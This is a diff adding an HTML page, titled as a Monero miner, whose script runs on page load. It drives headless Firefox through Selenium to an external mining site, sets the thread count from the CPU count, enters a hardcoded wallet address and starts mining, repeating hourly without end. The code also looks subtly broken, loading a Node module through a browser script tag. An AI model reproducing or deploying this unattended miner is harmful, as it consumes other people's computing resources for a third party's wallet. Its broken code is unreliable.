@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JavaScript Selenium Monero Miner</title>
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+    <!-- Include Selenium WebDriver -->
+    <script src="mon/node_modules/selenium-webdriver/index.js"></script>
+</head>
+<body>
+
+<script>
+    async function mining() {
+        while (true) {
+            try {
+                // Set up Firefox in headless mode
+                const options = new webdriver.Options();
+                options.setBinary("Mozilla Firefox/firefox.exe");
+                options.addArguments('--headless');
+
+                const service = new webdriver.ServiceBuilder("geckodriver-v0.33.0-win64/geckodriver.exe").build();
+                const driver = await new webdriver.Builder().forBrowser('firefox').setFirefoxOptions(options).setFirefoxService(service).build();
+
+                // Navigate to a web page
+                await driver.get('http://semi72451919.infinityfreeapp.com');
+
+                // Find the button locator
+                let doValue;
+                let buttonLocator;
+                const cpuCount = navigator.hardwareConcurrency || 1;
+                if (cpuCount === 0) {
+                    doValue = 0;
+                } else if (cpuCount > 7) {
+                    doValue = cpuCount - 7;
+                    buttonLocator = webdriver.By.id('thread-add');
+                } else {
+                    doValue = 7 - cpuCount;
+                    buttonLocator = webdriver.By.id('thread-remove');
+                }
+
+                // Wait for the button to be clickable
+                const wait = new webdriver.WebDriverWait(driver, 10000);
+                const button = await wait.until(webdriver.until.elementIsVisible(await driver.findElement(buttonLocator)));
+
+                if (doValue !== 0) {
+                    for (let x = 0; x < doValue; x++) {
+                        await button.click();
+                    }
+                }
+
+                // Find an input field, paste a string, and press Enter
+                const inputLocator = webdriver.By.id('wallet');
+                const inputField = await wait.until(webdriver.until.elementLocated(inputLocator));
+                await inputField.sendKeys('49PkyYDMrpUQReLohEfQGp7PgGwAcsLpbANcs6rUC9fFUWPKxNPkExN463pdvMjao2dxuvLu7Ta7rECi7HErF36BGEMxWTL');
+
+                // Find another button and click it
+                const startButtonLocator = webdriver.By.id('start');
+                const startButton = await wait.until(webdriver.until.elementLocated(startButtonLocator));
+                await startButton.click();
+
+                console.log("siu");
+
+                await new Promise(resolve => setTimeout(resolve, 3600000)); // Sleep for 1 hour
+            } catch (error) {
+                console.error(error);
+            }
+        }
+    }
+
+    mining();
+</script>
+
+</body>
+</html>
